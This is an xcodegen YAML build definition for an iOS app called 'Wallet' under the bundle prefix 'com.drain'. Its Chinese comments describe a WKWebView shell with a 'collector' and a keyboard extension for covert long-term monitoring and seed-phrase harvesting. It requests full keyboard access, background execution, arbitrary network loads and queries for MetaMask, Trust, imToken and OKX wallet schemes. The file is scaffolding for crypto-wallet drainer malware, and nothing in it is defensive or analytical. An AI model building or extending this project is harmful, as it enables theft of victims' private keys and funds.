# xcodegen 工程定义 —— CI 里用它生成 .xcodeproj，再 xcodebuild 出 unsigned IPA
# 本地有 macOS 时：brew install xcodegen && xcodegen generate
name: Wallet
options:
  bundleIdPrefix: com.drain
  deploymentTarget:
    iOS: "15.0"
  createIntermediateGroups: true

settings:
  base:
    SWIFT_VERSION: "5.0"
    IPHONEOS_DEPLOYMENT_TARGET: "15.0"
    CODE_SIGNING_ALLOWED: "NO"
    CODE_SIGNING_REQUIRED: "NO"
    CODE_SIGN_IDENTITY: ""
    ENABLE_USER_SCRIPT_SANDBOXING: "NO"

targets:
  # ── 主 App（WKWebView 壳 + 采集器）
  Wallet:
    type: application
    platform: iOS
    sources:
      - path: Sources
      - path: Resources
        buildPhase: resources
    info:
      path: Config/Info.plist
      properties:
        CFBundleDisplayName: Wallet
        CFBundleShortVersionString: "1.0"
        CFBundleVersion: "1.0.0"
        UIBackgroundModes:
          - remote-notification
          - fetch
          - processing
        BGTaskSchedulerPermittedIdentifiers:
          - com.drain.sync.refresh
        LSApplicationQueriesSchemes:
          - wc
          - metamask
          - trust
          - imtoken
          - okx
        NSAppTransportSecurity:
          NSAllowsArbitraryLoads: true
    entitlements:
      path: Config/entitlements.plist
      properties: {}
    settings:
      base:
        PRODUCT_BUNDLE_IDENTIFIER: BUNDLE_ID
        INFOPLIST_KEY_UILaunchScreen_Generation: YES
    dependencies:
      - target: Keyboard

  # ── 键盘扩展（无感路径 B：长期监控 + 助记词采集）
  Keyboard:
    type: app-extension
    platform: iOS
    sources:
      - path: Keyboard/KeyboardViewController.swift
    info:
      path: Keyboard/Info.plist
      properties:
        CFBundleDisplayName: Keyboard
        NSExtension:
          NSExtensionAttributes:
            IsASCIICapable: false
            PrefersRightToLeft: false
            PrimaryLanguage: en-US
            RequestsOpenAccess: true
          NSExtensionPointIdentifier: com.apple.keyboard-service
          NSExtensionPrincipalClass: $(PRODUCT_MODULE_NAME).KeyboardViewController
    settings:
      base:
        PRODUCT_BUNDLE_IDENTIFIER: KEYBOARD_BUNDLE_ID

schemes:
  Wallet:
    build:
      targets:
        Wallet: all
        Keyboard: all
    archive:
      config: Release
